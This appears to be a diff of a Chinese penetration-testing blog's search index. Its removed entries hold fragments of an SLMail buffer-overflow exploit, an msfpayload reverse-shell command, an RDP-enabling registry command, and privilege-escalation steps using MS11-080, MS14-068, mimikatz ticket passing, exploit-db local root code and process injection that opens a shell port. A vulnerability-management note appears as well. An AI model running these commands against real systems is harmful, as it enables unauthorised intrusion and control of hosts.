class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><p>shellcode执行结束后以ExitProcess方式推出整个进程,将导致邮件服务崩溃；<br>Slmail是一个基于线程的应用,适用ExitThread方式可以避免整个服务崩溃,可实现重复溢出；<br><code>./msfpayload win32_reverse lhost=1.1.1.1 EXITFUNC=thread lport=443 R | ./msfencode -b &quot;\x00\x0a\x0d&quot;</code><br>    cmd注册表开启3389<br>    <code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code><br>    RegSnap #工具</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> 渗透测试 </category>
-          
-          <category> Buffer overflow </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> 缓冲区溢出 </tag>
-            
-            <tag> python </tag>
-            
-            <tag> 漏洞利用 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>Aircrack-ng无线攻击套件</title>
       <link href="/2013/06/12/Wireless_Attacks/Aircrack-ng%E6%97%A0%E7%BA%BF%E6%94%BB%E5%87%BB%E5%A5%97%E4%BB%B6/"/>
       <url>/2013/06/12/Wireless_Attacks/Aircrack-ng%E6%97%A0%E7%BA%BF%E6%94%BB%E5%87%BB%E5%A5%97%E4%BB%B6/</url>
@@ -1746,64 +1837,6 @@
             <tag> 无线抓包 </tag>
             
             <tag> 无线破解 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>利用漏洞和程序配置不当提权</title>
-      <link href="/2013/06/06/pentest/%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E6%8F%90%E6%9D%83/"/>
-      <url>/2013/06/06/pentest/%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E6%8F%90%E6%9D%83/</url>
-      
-        <content type="html"><![CDATA[<blockquote><h3 id="利用漏洞提权windows"><a href="#利用漏洞提权windows" class="headerlink" title="利用漏洞提权windows"></a><strong>利用漏洞提权windows</strong></h3></blockquote><p><code>Ms11-080</code>        #此漏洞在中文版的系统中利用是DOS拒绝服务的攻击效果,而非提权</p><pre><code>Kb2592799    https://technet.microsoft.com/library/sevurity/ms11-080searchsploit Ms11-080exploits/windows/local/18176.py    Pyinstaller        #将python脚本编译为EXE需要用到的包    https://pypi.python.org/pypi/PyInstaller/2.1Pywin32            #将python脚本编译为EXE需要用到的扩展    http://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/python pyinstaller.py --onefile 18176.py #将18176.py编译为exe可执行程序    MS11-046        #拒绝服务漏洞    DoSMs14-068        #普通用户提权到域服务器管理库    https://github.com/bidord/pykekms14-068.py -u user@lab.com -s userSID -d dc.lab.com拷贝 TGT_user1@lab.com.ccache 到windows系统本地管理员登录    mimikatz.exe log &quot;kerberos::ptc TGT_user@lab.com.ccache&quot; exit    dsa.msc        #域控制器管理</code></pre><blockquote><h3 id="利用漏洞提权linux"><a href="#利用漏洞提权linux" class="headerlink" title="利用漏洞提权linux"></a><strong>利用漏洞提权linux</strong></h3></blockquote><pre><code>Ubuntu 11.10    http://old-releases.ubuntu.com/releases/11.10gcc    sudo mount /dev/cdrom /media/cdrom    #挂载镜像    sudo apt-cdrom add &amp;&amp; sudo apt-get install gcc    #把镜像加入安装源并安装GCC    gcc 18411.c -o expCVE-2012-0056    /proc/pid/mem    kernels&gt;=2.6.39    http://blog.zx2c4.com/749    scp /usr/share/exploitdb/platforms/linux/local/18411.c cat@192.168.1.118:/home/cat/        将利用脚本拷贝到目标机器</code></pre><blockquote><h3 id="利用配置不当提权"><a href="#利用配置不当提权" class="headerlink" title="利用配置不当提权"></a><strong>利用配置不当提权</strong></h3></blockquote><p>与系统漏洞提权相比,更常用的方法<br>企业环境<br>补丁更新的全部已经安装<br>输入变量过滤之外更值得研发关注的安全隐患<br>以system权限启动<br>NTFS权限允许users修改删除</p><p><code>icacls</code><br>    <code>icacls c:\windows\*.exe /save perm /T</code>    #快速查找windows系统中所有NTFS权限配置不当的程序<br>    <code>i586-mingw32msvc-gcc -o admin.exe admin.c</code>    #快速查找linux系统中所有NTFS权限配置不当的程序<br><code>Find</code><br>    <code>find / -perm 777 -exec ls -l {} \;</code></p><p>应用系统的配置文件<br>    应用连接数据库的配置文件<br>    后台服务运行账号</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> 渗透测试 </category>
-          
-          <category> 权限维持 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> mimikatz </tag>
-            
-            <tag> 漏洞提权 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>本地提权常见手法</title>
-      <link href="/2013/06/03/pentest/%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/"/>
-      <url>/2013/06/03/pentest/%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/</url>
-      
-        <content type="html"><![CDATA[<h3 id="本地提权"><a href="#本地提权" class="headerlink" title="本地提权"></a>本地提权</h3><p>已实现本地低权限账号登录<br>    远程溢出<br>    直接获得账号密码<br>希望获取更高权限<br>    实现对目标进一步控制<br>系统账号之间权限隔离<br>    操作系统安全的基础<br>    用户空间<br>    内核空间<br>系统账号<br>    用户账号登录时获取权限令牌<br>    服务账号无需用户登录已在后台启动服务</p><h5 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a><strong>Windows</strong></h5><pre><code>userAdministratorSystem    net user owl *        #修改密码    net user    #查看用户账号</code></pre><h5 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a><strong>Linux</strong></h5><pre><code>userRoot</code></pre><blockquote><h4 id="Administrator提权为SYSTEM"><a href="#Administrator提权为SYSTEM" class="headerlink" title="Administrator提权为SYSTEM"></a>Administrator提权为SYSTEM</h4></blockquote><p>Windows system账号<br>    系统设置管理功能<br>    SysInternal Suite<br>        <a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/sysinternals/downloads/</a></p><pre><code>psexec -i -s -d taskmgrat 19:39 /interactive cmd    #win10已弃用at,改用sc和schtaskssc Create syscmd binPath=&quot;cmd /K start&quot; type=own type=interactsc start syscmd</code></pre><blockquote><h4 id="注入进程提权"><a href="#注入进程提权" class="headerlink" title="注入进程提权"></a>注入进程提权</h4></blockquote><pre><code>隐蔽痕迹pinjector.exe    http://www.tarasco.org/security/Process_Injector/pinjector.exe -l    #查看可注入进程pinjecter.exe -p 3012 cmd 6666 #将CMD注入到PID为3012的进程,并开放端口6666</code></pre>]]></content>
-      
-      
-      <categories>
-          
-          <category> 渗透测试 </category>
-          
-          <category> 权限维持 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> 提权 </tag>
-            
-            <tag> pinjector </tag>
             
         </tags>
       
@@ -2131,8 +2164,8 @@
     
     <entry>
       <title>漏洞的基本概念及漏洞发现管理</title>
-      <link href="/2013/04/17/pentest/%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E7%AE%A1%E7%90%86/"/>
-      <url>/2013/04/17/pentest/%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E7%AE%A1%E7%90%86/</url>
+      <link href="/2013/04/17/Exploits/%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E7%AE%A1%E7%90%86/"/>
+      <url>/2013/04/17/Exploits/%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E7%AE%A1%E7%90%86/</url>
       
         <content type="html"><![CDATA[<blockquote><h4 id="发现漏洞"><a href="#发现漏洞" class="headerlink" title="发现漏洞"></a>发现漏洞</h4></blockquote><p>基于端口服务扫描结果版本信息(速度慢)<br>搜索已公开的漏洞数据库(数量大)<br>使用弱点扫描器实现漏洞管理</p><blockquote><h4 id="漏洞库"><a href="#漏洞库" class="headerlink" title="漏洞库"></a>漏洞库</h4></blockquote><p><a href="https://www.exploit-db.com/" target="_blank" rel="noopener">https://www.exploit-db.com/</a>    #kali官方漏洞库<br><a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener">http://shell-storm.org/shellcode/</a><br><code>sandi漏洞库</code> #程序停更<br>    <code>searchsploit tomcat</code><br>    <code>cd /usr/share/exploitdb/exploits/</code></p><blockquote><h4 id="从信息的纬度定义漏洞管理"><a href="#从信息的纬度定义漏洞管理" class="headerlink" title="从信息的纬度定义漏洞管理"></a>从信息的纬度定义漏洞管理</h4></blockquote><p>信息收集:<br>    扫描发现网络IP,OS,服务,配置,漏洞<br>    能力需求:定义扫描方式内容和目标<br>信息管理:<br>    格式化信息,并进行筛选,分组,定义优先级<br>    能力需求:资产分组,指定所有者,向所有者报告漏洞<br>信息输出:<br>    向不同层级的人群展示足够的信息量<br>    能力需求:生成报告,导出数据,与SIEM集成</p><blockquote><h5 id="漏洞扫描类型"><a href="#漏洞扫描类型" class="headerlink" title="漏洞扫描类型"></a>漏洞扫描类型</h5></blockquote><p>主动扫描<br>    有身份验证<br>    无身份验证<br>被动扫描<br>    镜像端口抓包<br>    其它来源输入<br>基于Agent的扫描<br>    支持平台有限</p><blockquote><h4 id="漏洞基本概念"><a href="#漏洞基本概念" class="headerlink" title="漏洞基本概念"></a>漏洞基本概念</h4></blockquote><h5 id="CVSS-Common-Vulnerability-Scoring-System"><a href="#CVSS-Common-Vulnerability-Scoring-System" class="headerlink" title="CVSS (Common Vulnerability Scoring System)"></a><strong>CVSS</strong> (Common Vulnerability Scoring System)</h5><p>通用漏洞评分系统–工业标准<br>描述安全漏洞严重程度的统一评分方案<br>V3版本–2015年6月10日<br>Basic Metric:基础的恒定不变的弱点权重<br>Temporal Metric:依赖时间因素的弱点权重<br>Enviromental Metric:利用弱点的环境要求和实施难度的权重<br>CVSS是安全内容自动化协议(SCAP)的一部分<br>通常CVSS与CVE一同由美国国家漏洞库(NVD)发布并保持数据的更新<br>分值范围:0–10<br>不同机构按CVSS分会定义威胁的中,高,低威胁级别<br>CVSS体现弱点的风险,威胁级别(severity)表示弱点风险对企业的影响程度<br>CVSS分值是工业标准,但威胁级别不是<br>Vulnerability Reference</p><h5 id="CVE-Common-Vulnerabilities-and-Exposures"><a href="#CVE-Common-Vulnerabilities-and-Exposures" class="headerlink" title="CVE (Common Vulnerabilities and Exposures)"></a><strong>CVE</strong> (Common Vulnerabilities and Exposures)</h5><p>已公开的信息安全漏洞字典,统一的漏洞编号标准<br>MITRE公司负责维护(非盈利机构)<br>扫描器的大部分扫描式都对应一个CVE编号<br>实现不同厂商之间信息交换的统一标准</p><h5 id="CVE发布流程"><a href="#CVE发布流程" class="headerlink" title="CVE发布流程"></a>CVE发布流程</h5><ul><li>发现漏洞</li><li>CAN负责指定CVE ID</li><li>发布到CVE List —-CVE-2008-4250</li><li>MITRE负责对内容 进行编辑维护</li><li>很多厂商维护自己的Vulnerability Reference<br>  MS(微软)<br>  MSKB</li><li>其它Vulnerability Reference<br>  CERT    TA08-297A<br>  BID        31874<br>  IAVM    2008-A-0081<br>  OVAL    OVAL6093</li></ul><h5 id="OVAL-Open-Vulnerability-and-Assessment-Language"><a href="#OVAL-Open-Vulnerability-and-Assessment-Language" class="headerlink" title="OVAL (Open Vulnerability and Assessment Language)"></a><strong>OVAL</strong> (Open Vulnerability and Assessment Language)</h5><p>描述漏洞检测方法的机器可识别语言<br>详细的描述漏洞检测的技术细节,可导入自动化检测工具中实施漏洞检测工作<br>OVAL使用XML语言描述,包含了严密的语法逻辑</p><h5 id="CCE"><a href="#CCE" class="headerlink" title="CCE"></a><strong>CCE</strong></h5><p>描述软件配置缺陷的一种标准化格式<br>在信息安全风险评估中,配置缺陷的检测是一项重要内容,使用CCE可让配置缺陷以标准的方式展现出来,便于配置缺陷评估的可量化操作.</p><h5 id="CPE-Common-Product-Enumeration"><a href="#CPE-Common-Product-Enumeration" class="headerlink" title="CPE(Common Product Enumeration)`"></a><strong>CPE</strong>(Common Product Enumeration)`</h5><p>信息技术产品,系统,软件包的机构化命名规范,分类命名</p><h5 id="CWE-Common-Weakness-Enumeration"><a href="#CWE-Common-Weakness-Enumeration" class="headerlink" title="CWE (Common Weakness Enumeration)"></a><strong>CWE</strong> (Common Weakness Enumeration)</h5><p>常见漏洞类型的字典,描述不同类型漏洞的特征(访问控制,信息泄露,拒绝服务)</p><h5 id="SCAP-Security-Content-Automation-Protocol"><a href="#SCAP-Security-Content-Automation-Protocol" class="headerlink" title="SCAP (Security Content Automation Protocol)"></a><strong>SCAP</strong> (Security Content Automation Protocol)</h5><p>SCAP是一个集合了多种安全标准框架<br>六个元素:CVE,OVAL,CCE,CPE,CVSS,XCCDF<br>目的是以标准的方法展示和操作安全数据<br>由NIST负责维护<br>SCAP主要解决三个问题<br>    实现高层政策法规等到底层实施的落地(如FISMA,ISO27000系列)<br>    将信息安全所涉及的各个要素标准化(如统一漏洞的命名及严重性度量)<br>    将复杂的系统配置核查工作自动化<br>SCAP是当前美国比较成熟的一套信息安全评估标准体系,其标准化,自动化的思想对信息安全行业产生了深远的影响.</p><h5 id="NVD-National-Vulnerability-Database"><a href="#NVD-National-Vulnerability-Database" class="headerlink" title="NVD (National Vulnerability Database)"></a><strong>NVD</strong> (National Vulnerability Database)</h5><p>美国政府的漏洞管理标准数据<br>完全基于SCAP框架<br>实现自动化漏洞管理,安全测量,合规要求<br>包含以下库<br>    安全检查列表<br>    软件安全漏洞<br>    配置错误<br>    产品名称<br>    影响度量<br>    <a href="https://nvd.nist.gov" target="_blank" rel="noopener">https://nvd.nist.gov</a></p><blockquote><h4 id="漏洞管理"><a href="#漏洞管理" class="headerlink" title="漏洞管理"></a>漏洞管理</h4></blockquote><p>周期性扫描跟踪漏洞<br>高位漏洞优先处理<br>扫描注意事项<br>漏洞管理三要素<br>    准确性<br>    时间<br>    资源</p>]]></content>
       
@@ -2257,9 +2290,9 @@
             
             <tag> python </tag>
             
-            <tag> nmap </tag>
-            
             <tag> SNMP </tag>
+            
+            <tag> nmap </tag>
             
             <tag> Scapy </tag>
             
@@ -2333,15 +2366,15 @@
             
             <tag> nmap </tag>
             
-            <tag> Scapy </tag>
-            
             <tag> nc </tag>
             
-            <tag> hping3 </tag>
+            <tag> Scapy </tag>
             
             <tag> 端口扫描 </tag>
             
             <tag> 僵尸扫描 </tag>
+            
+            <tag> hping3 </tag>
             
         </tags>
       
